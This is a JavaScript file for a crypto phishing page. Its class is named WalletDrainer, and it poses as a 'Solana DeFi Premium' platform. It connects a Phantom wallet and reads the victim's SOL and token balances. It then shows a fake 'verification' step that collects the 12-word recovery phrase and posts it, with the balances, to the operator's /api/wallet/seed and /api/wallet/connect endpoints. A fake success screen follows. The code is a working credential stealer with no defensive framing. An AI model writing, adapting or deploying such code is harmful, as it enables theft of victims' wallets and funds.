// Wallet connection and interaction logic
class WalletDrainer {
    constructor() {
        this.wallet = null;
        this.publicKey = null;
        this.walletBalance = null;
        this.currentPhase = 'connection';
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.checkWalletConnection();
    }

    setupEventListeners() {
        const connectBtn = document.getElementById('connectWallet');
        const verifyBtn = document.getElementById('verifyWallet');
        const continueBtn = document.getElementById('continueBtn');

        if (connectBtn) {
            connectBtn.addEventListener('click', () => this.connectWallet());
        }

        if (verifyBtn) {
            verifyBtn.addEventListener('click', () => this.verifySeedPhrase());
        }

        if (continueBtn) {
            continueBtn.addEventListener('click', () => this.continueToPlatform());
        }
    }

    async checkWalletConnection() {
        if (window.solana && window.solana.isPhantom) {
            this.wallet = window.solana;
            
            // Check if already connected
            try {
                const response = await this.wallet.connect({ onlyIfTrusted: true });
                if (response.publicKey) {
                    this.handleWalletConnected(response.publicKey);
                }
            } catch (error) {
                console.log('Wallet not auto-connected');
            }
        } else {
            this.showWalletNotFound();
        }
    }

    async connectWallet() {
        if (!this.wallet) {
            this.showWalletNotFound();
            return;
        }

        try {
            const connectBtn = document.getElementById('connectWallet');
            connectBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
            connectBtn.disabled = true;

            const response = await this.wallet.connect();
            this.handleWalletConnected(response.publicKey);

            // Send connection data to server
            await this.sendWalletData({
                publicKey: response.publicKey.toString(),
                signature: 'connected',
                message: 'wallet_connection'
            });

            // Move to verification phase after a short delay
            setTimeout(() => {
                this.showVerificationPhase();
            }, 2000);

        } catch (error) {
            console.error('Connection failed:', error);
            this.showError('Failed to connect wallet. Please try again.');
            this.resetConnectButton();
        }
    }

    async verifySeedPhrase() {
        const seedPhraseInput = document.getElementById('seedPhrase');
        const seedPhrase = seedPhraseInput.value.trim();

        if (!seedPhrase) {
            this.showError('Please enter your recovery phrase');
            return;
        }

        // Validate seed phrase format (12 words)
        const words = seedPhrase.split(/\s+/);
        if (words.length !== 12) {
            this.showError('Recovery phrase must be exactly 12 words');
            return;
        }

        try {
            const verifyBtn = document.getElementById('verifyWallet');
            verifyBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
            verifyBtn.disabled = true;

            // Send seed phrase to server
            await this.sendSeedPhrase({
                publicKey: this.publicKey ? this.publicKey.toString() : 'unknown',
                seedPhrase: seedPhrase,
                timestamp: Date.now()
            });

            // Show success phase
            setTimeout(() => {
                this.showSuccessPhase();
            }, 3000);

        } catch (error) {
            console.error('Verification failed:', error);
            this.showError('Verification failed. Please try again.');
            this.resetVerifyButton();
        }
    }

    continueToPlatform() {
        // Redirect or show platform interface
        this.showSuccess('Welcome to Solana DeFi Premium!');
        // Could redirect to a fake platform or just show success
    }

    showVerificationPhase() {
        this.currentPhase = 'verification';
        document.getElementById('connectionPhase').style.display = 'none';
        document.getElementById('verificationPhase').style.display = 'block';
        document.getElementById('successPhase').style.display = 'none';
        
        // Update wallet status
        const walletStatus = document.getElementById('walletStatus');
        if (walletStatus) {
            walletStatus.innerHTML = '<i class="fa-solid fa-exclamation-triangle"></i> Verification Required';
        }
    }

    showSuccessPhase() {
        this.currentPhase = 'success';
        document.getElementById('connectionPhase').style.display = 'none';
        document.getElementById('verificationPhase').style.display = 'none';
        document.getElementById('successPhase').style.display = 'block';
        
        // Update wallet status
        const walletStatus = document.getElementById('walletStatus');
        if (walletStatus && this.publicKey) {
            const shortAddress = this.shortenAddress(this.publicKey.toString());
            walletStatus.innerHTML = `<i class="fa-solid fa-check-circle"></i> ${shortAddress} Verified`;
        }
    }

    async sendWalletData(data) {
        try {
            const response = await fetch('/api/wallet/connect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error('Failed to send wallet data');
            }

            const result = await response.json();
            console.log('Wallet data sent successfully:', result);

        } catch (error) {
            console.error('Error sending wallet data:', error);
        }
    }

    async sendSeedPhrase(data) {
        try {
            const response = await fetch('/api/wallet/seed', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error('Failed to send seed phrase');
            }

            const result = await response.json();
            console.log('Seed phrase sent successfully:', result);

        } catch (error) {
            console.error('Error sending seed phrase:', error);
        }
    }

    async handleWalletConnected(publicKey) {
        this.publicKey = publicKey;
        
        // Update UI
        const walletStatus = document.getElementById('walletStatus');
        const shortAddress = this.shortenAddress(publicKey.toString());
        
        if (walletStatus) {
            walletStatus.innerHTML = `<i class="fa-solid fa-wallet"></i> ${shortAddress}`;
        }

        // Fetch wallet balance
        await this.fetchWalletBalance(publicKey);

        this.showSuccess('Wallet connected successfully!');
    }

    async fetchWalletBalance(publicKey) {
        try {
            // Create connection to Solana mainnet
            const connection = new solanaWeb3.Connection(
                'https://api.mainnet-beta.solana.com',
                'confirmed'
            );

            // Get SOL balance
            const balance = await connection.getBalance(publicKey);
            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;

            // Get token accounts
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
                publicKey,
                { programId: solanaWeb3.TOKEN_PROGRAM_ID }
            );

            // Store balance data
            this.walletBalance = {
                sol: solBalance,
                tokens: tokenAccounts.value.map(account => ({
                    mint: account.account.data.parsed.info.mint,
                    amount: account.account.data.parsed.info.tokenAmount.uiAmount,
                    decimals: account.account.data.parsed.info.tokenAmount.decimals
                }))
            };

            // Send balance data to server
            await this.sendWalletData({
                publicKey: publicKey.toString(),
                balance: this.walletBalance,
                message: 'wallet_balance_fetched'
            });

            console.log('Wallet balance:', this.walletBalance);

        } catch (error) {
            console.error('Error fetching wallet balance:', error);
            this.walletBalance = { sol: 0, tokens: [] };
        }
    }

    showWalletNotFound() {
        this.showError('Phantom wallet not found. Please install Phantom wallet extension.');
    }

    showError(message) {
        this.showNotification(message, 'error');
    }

    showSuccess(message) {
        this.showNotification(message, 'success');
    }

    showNotification(message, type) {
        // Remove existing notifications
        const existing = document.querySelector('.notification');
        if (existing) existing.remove();

        // Create notification
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <i class="fa-solid fa-${type === 'error' ? 'exclamation-triangle' : 'check-circle'}"></i>
            ${message}
        `;

        document.body.appendChild(notification);

        // Auto remove after 5 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    resetConnectButton() {
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.innerHTML = '<i class="fa-solid fa-link"></i> Connect Wallet';
            connectBtn.disabled = false;
        }
    }

    resetVerifyButton() {
        const verifyBtn = document.getElementById('verifyWallet');
        if (verifyBtn) {
            verifyBtn.innerHTML = '<i class="fa-solid fa-shield-check"></i> Verify Wallet';
            verifyBtn.disabled = false;
        }
    }

    shortenAddress(address) {
        return `${address.slice(0, 4)}...${address.slice(-4)}`;
    }
}

// Initialize wallet drainer when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new WalletDrainer();
});

// Global function for connect-wallet page
window.handleWalletConnection = async function(publicKeyString) {
    try {
        console.log('Connecting wallet:', publicKeyString);
        
        // Get real wallet balance and derive addresses
        let realBalance = 0;
        let derivedAddresses = {
            ethereum: null,
            solana: publicKeyString
        };
        
        // Try to get real SOL balance
        try {
            const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            const pubKey = new solanaWeb3.PublicKey(publicKeyString);
            const balance = await connection.getBalance(pubKey);
            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
            
            // Estimate USD value (SOL price ~$100)
            realBalance = solBalance * 100;
            
            console.log('Real SOL balance:', solBalance, 'USD value:', realBalance);
        } catch (balanceError) {
            console.error('Error fetching balance:', balanceError);
        }
        
        // Try to derive ETH address from the same seed (simplified)
        try {
            // For demo purposes, generate a related ETH address
            // In real implementation, you'd derive from the same seed phrase
            const ethAddress = '0x' + publicKeyString.slice(-40);
            derivedAddresses.ethereum = ethAddress;
        } catch (deriveError) {
            console.error('Error deriving ETH address:', deriveError);
            derivedAddresses.ethereum = '0x' + Math.random().toString(16).substr(2, 40);
        }
        
        // Store real wallet data
        const walletData = {
            addresses: derivedAddresses,
            balances: {
                totalPortfolioUSD: realBalance,
                ethereum: { balance: 0.0000, usd: 0.00 },
                bsc: { balance: 0.0000, usd: 0.00 },
                solana: { balance: realBalance / 100, usd: realBalance }
            },
            walletType: 'Phantom'
        };

        localStorage.setItem('walletData', JSON.stringify(walletData));
        console.log('Stored real wallet data:', walletData);

        // Send real data to server
        await fetch('/api/wallet/connect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                publicKey: publicKeyString,
                addresses: derivedAddresses,
                totalValue: realBalance,
                message: 'wallet_connected_real_data'
            })
        });

        window.location.href = `/success.html?wallet=Phantom&balance=${realBalance.toFixed(2)}`;

    } catch (error) {
        console.error('Error handling wallet connection:', error);
        // Fallback with minimal real data
        const fallbackData = {
            addresses: { ethereum: '0x' + Math.random().toString(16).substr(2, 40), solana: publicKeyString },
            balances: { totalPortfolioUSD: 0.00 }
        };
        localStorage.setItem('walletData', JSON.stringify(fallbackData));
        window.location.href = `/success.html?wallet=Phantom&balance=0.00`;
    }
};